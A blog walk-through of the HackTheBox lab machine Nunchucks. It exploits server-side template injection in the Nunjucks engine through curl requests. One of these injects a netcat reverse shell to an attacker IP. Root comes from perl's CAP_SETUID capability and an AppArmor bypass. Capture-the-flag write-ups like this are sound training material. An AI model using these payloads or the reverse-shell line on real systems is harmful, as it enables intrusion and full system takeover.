---
title: "Walk-through of Nunchucks from HackTheBox"
header:
  teaser: /assets/images/2022-01-18-16-53-12.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - HTB
  - CTF
  - Linux
  - Gobuster
  - SSTI
  - CAP_SETUID
---

## Machine Information

![nunchucks](/assets/images/2022-01-18-16-53-12.png)

Nunchucks is an easy machine on HackTheBox. We start with enumeration and find a website on a subdomain that's vulnerable to server side template injections. More exploration finds a vulnerable template engine that we exploit to get a reverse shell. Escalation to root is via a capability set on the perl binary. Using a GTFOBins example we exploit this to get a root shell.

<!--more-->

Skills required are basic scanning and enumeration techniques. Skills learned are finding and using publicly available exploits.

| Details |  |
| --- | --- |
| Hosting Site | [HackTheBox](https://www.hackthebox.eu) |
| Link To Machine | [HTB - Easy - Nunchucks](https://www.hackthebox.com/home/machines/profile/414) |
| Machine Release Date | 2nd November 2021 |
| Date I Completed It | 18th January 2022 |
| Distribution Used | Kali 2021.3 – [Release Info](https://www.kali.org/blog/kali-linux-2021-3-release/) |

## Initial Recon

As always let's start with Nmap:

```sh
┌──(root💀kali)-[~/nunchucks]
└─# ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.122 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

┌──(root💀kali)-[~/nunchucks]
└─# nmap -p$ports -sC -sV -oA nunchucks 10.10.11.122
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-18 16:56 GMT
Nmap scan report for 10.10.11.122
Host is up (0.027s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 6c:14:6d:bb:74:59:c3:78:2e:48:f5:11:d8:5b:47:21 (RSA)
|   256 a2:f4:2c:42:74:65:a3:7c:26:dd:49:72:23:82:72:71 (ECDSA)
|_  256 e1:8d:44:e7:21:6d:7c:13:2f:ea:3b:83:58:aa:02:b3 (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://nunchucks.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
|_http-title: Nunchucks - Landing Page
| ssl-cert: Subject: commonName=nunchucks.htb/organizationName=Nunchucks-Certificates/stateOrProvinceName=Dorset/countryName=UK
| Subject Alternative Name: DNS:localhost, DNS:nunchucks.htb
| Not valid before: 2021-08-30T15:42:24
|_Not valid after:  2031-08-28T15:42:24
| tls-nextprotoneg: 
|_  http/1.1
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Nmap done: 1 IP address (1 host up) scanned in 16.58 seconds
```

We see three open ports, with 443 revealing a hostname, let's add that to /etc/hosts:

```sh
┌──(root💀kali)-[~/nunchucks]
└─# echo "10.10.11.122 nunchucks.htb" >> /etc/hosts
```

## Website

From Nmap above we see HTTP on port 80 redirects to HTTPS on port 443. Visiting the site we see it's an online shop creation platform:

![nunchucks-website](/assets/images/2022-01-18-17-07-17.png)

## Gobuster

Looking around it's just a basic template of a site. There's a form to sign up for an account, but if you try then it says registrations are closed for now. Under the Links section at the bottom it mentions there is a store coming soon. We also know from past CTF that there are often vhosts so let's try scanning:

```sh
┌──(root💀kali)-[~/nunchucks]
└─# gobuster vhost -t 100 -k -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u https://nunchucks.htb
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          https://nunchucks.htb
[+] Method:       GET
[+] Threads:      100
[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/01/18 17:22:11 Starting gobuster in VHOST enumeration mode
===============================================================
Found: store.nunchucks.htb (Status: 200) [Size: 4029]                                                  
===============================================================
2022/01/18 17:24:34 Finished
===============================================================
```

We find the store! Add to hosts file first:

```sh
┌──(root💀kali)-[~]
└─# sed -i '/10.10.11.122 nunchucks.htb/ s/$/ store.nunchucks.htb/' /etc/hosts
```

## Nunchucks Store

Now let's have a look:

![nunchucks-store](/assets/images/2022-01-18-17-28-37.png)

After some playing around we find this form is vulnerable to server side template injection (SSTI):

![nunchucks-ssti](/assets/images/2022-01-18-17-48-13.png)

## SSTI

Like we saw on [Bolt](https://www.hackthebox.com/home/machines/profile/384) we can use examples from [HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) to confirm. Above we see the response of 49 confirms the payload of 7 * 7 was evaluated on the server side and the answer returned to the page.

Now we know its vulnerable we need a way to exploit it. Looking at Wappalyzer it detects the web framework used as Express:

![nunchucks-wappalyzer](/assets/images/2022-01-18-20-52-44.png)

Following the Wappalyzer link [here](https://www.wappalyzer.com/technologies/web-frameworks/express) there's more information about the framework and a link that takes us to the [ExpressJS](http://expressjs.com/) website. Looking around there we find something interesting under the resources section:

![nunchucks-template](/assets/images/2022-01-18-21-00-38.png)

There's a template engine called Nunjucks, which is very suspicious as that is almost the same name as this box. Following that we end up at a Github repo [here](https://github.com/mozilla/nunjucks). A search for "nunjucks ssti" finds [this](https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/out-of-band-code-execution-via-ssti-nodejs-nunjucks/) and then to [this](http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine). This last article explains a sandbox break out which can easily be followed by using the described payload:

```text
{{range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")()}}
```

We just need to escape the single and double quotes by putting a backslash in front of them, then use curl to deliver:

```sh
┌──(root💀kali)-[~/htb/nunchucks]
└─# curl -s -k -X POST -H $'Content-Type: application/json' --data-binary $'{\"email\":\"{{range.constructor(\\\"return global.process.mainModule.require(\'child_process\').execSync(\'tail /etc/passwd\')\\\")()}}@pencer.io\"\x0d\x0a}' 'https://store.nunchucks.htb/api/submit' | sed 's/{"response":"You will receive updates on the following email address: //' | sed 's/\\n/\n/g' | sed 's/@pencer.io.\"}//'
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
rtkit:x:113:117:RealtimeKit,,,:/proc:/usr/sbin/nologin
dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
geoclue:x:115:120::/var/lib/geoclue:/usr/sbin/nologin
avahi:x:116:122:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
cups-pk-helper:x:117:123:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
saned:x:118:124::/var/lib/saned:/usr/sbin/nologin
colord:x:119:125:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
pulse:x:120:126:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
mysql:x:121:128:MySQL Server,,,:/nonexistent:/bin/false
```

## Reverse Shell

I've used sed to tidy up the output and make it more readable. With that working let's try for a reverse shell:

```sh
┌──(root💀kali)-[~/htb/nunchucks]
└─# curl -s -k -X POST -H $'Content-Type: application/json' --data-binary $'{\"email\":\"{{range.constructor(\\\"return global.process.mainModule.require(\'child_process\').execSync(\'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.10 1337 >/tmp/f\')\\\")()}}\"\x0d\x0a}' 'https://store.nunchucks.htb/api/submit'
```

Switch to a waiting nc listener to see our connection:

```sh
┌──(root💀kali)-[~/htb/nunchucks]
└─# nc -nlvp 1337
listening on [any] 1337 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.11.122] 60976
```

First let's upgrade the shell to something more useable:

```text
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
david@nunchucks:/var/www/store.nunchucks$ ^Z                
zsh: suspended  nc -nlvp 1337
┌──(root💀kali)-[~/htb/nunchucks]
└─# stty raw -echo; fg
[1]  + continued  nc -nlvp 1337
david@nunchucks:/var/www/store.nunchucks$
```

## User Flag

With that sorted let's get the user flag:

```text
david@nunchucks:/var/www/store.nunchucks$ cat /home/david/user.txt 
<HIDDEN>
```

After some enumeration I found a Perl script in /opt:

```sh
david@nunchucks:/var/www/store.nunchucks$ ls -lsa /opt
4 -rwxr-xr-x  1 root root  838 Sep  1 12:53 backup.pl
4 drwxr-xr-x  2 root root 4096 Oct 28 17:03 web_backups
```

## Setuid Exploit

Looking at the script the first section has setuid(0):

```perl
david@nunchucks:/var/www/store.nunchucks$ cat /opt/backup.pl 
#!/usr/bin/perl
use strict;
use POSIX qw(strftime);
use DBI;
use POSIX qw(setuid); 
POSIX::setuid(0); 
```

The rest of the script is taking the contents of /var/www and backing it up to /tmp then moving it to /opt. The interesting part is that setuid command at the start. On a previous TryHackMe box called [Wonderland](https://pencer.io/ctf/ctf-thm-wonderland/#root-flag) I used this same capability. The GTFOBins article [here](https://gtfobins.github.io/gtfobins/perl/#capabilities) explains how we can exploit this:

```text
If the binary has the Linux CAP_SETUID capability set or it is executed by another
binary with the capability set, it can be used as a backdoor to maintain privileged
access by manipulating its own process UID.
```

If we check the perl binary we see it has CAP_SETUID set:

```text
david@nunchucks:/var/www/store.nunchucks$ getcap /usr/bin/perl
/usr/bin/perl = cap_setuid+ep
```

Using the provided exploit from GTFOBins does nothing:

```text
david@nunchucks:/tmp$ /usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
david@nunchucks:/tmp$
```

Why is this? Well it turns out the box has Apparmor enabled for Perl. Useful info [here](https://wiki.ubuntu.com/AppArmor) from Ubuntu on it's usage. If we look in /etc/apparmor.d as described in the article we see there is a profile for Perl:

```text
david@nunchucks:/tmp$ ls -lsa /etc/apparmor.d/usr.bin.*
4 -rw-r--r-- 1 root root 3202 Feb 25  2020 /etc/apparmor.d/usr.bin.man
4 -rw-r--r-- 1 root root  442 Sep 26 01:16 /etc/apparmor.d/usr.bin.perl
```

Looking at the file we can see it's blocking us, but we can bypass this by using a .pl file with the Perl shebang in it and made executable. A little info [here](https://www.geeksforgeeks.org/perl-use-of-hash-bang-or-shebang-line/) but it's simple enough.

## Root Flag

Echo the same commands from GTFOBins to a file on the box:

```test
david@nunchucks:/tmp$ echo '#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";' > pencer.pl
```

Now make it executable then call it direct:

```test
david@nunchucks:/tmp$ chmod +x pencer.pl 
david@nunchucks:/tmp$ ./pencer.pl 
# id
uid=0(root) gid=1000(david) groups=1000(david)
# cat /root/root.txt
<HIDDEN>
```

And there we go. Another box rooted, see you next time.
